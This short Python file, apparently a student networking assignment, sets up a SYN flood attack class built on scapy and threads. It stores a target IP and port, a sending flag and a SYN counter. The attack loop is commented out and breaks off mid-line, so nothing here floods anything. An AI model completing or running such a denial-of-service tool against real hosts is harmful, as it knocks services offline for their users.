import socket
from scapy.layers.inet import *
from threading import Thread


host_name = socket.gethostname()
host_ip = socket.gethostbyname(host_name)


class SynFlood(Thread):
    def __init__(self, dst_ip, dst_port):
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.sending = True                          # current process
        self.syn_count = 0                           # syn count
        self.data = "Hello testing assignment 3"     # data
        Thread.__init__(self)

    # def syn_flood_attack(self):
    #
    #     while self.sending:
    #         self.syn_flood_src = IP(src=host_ip, dst=)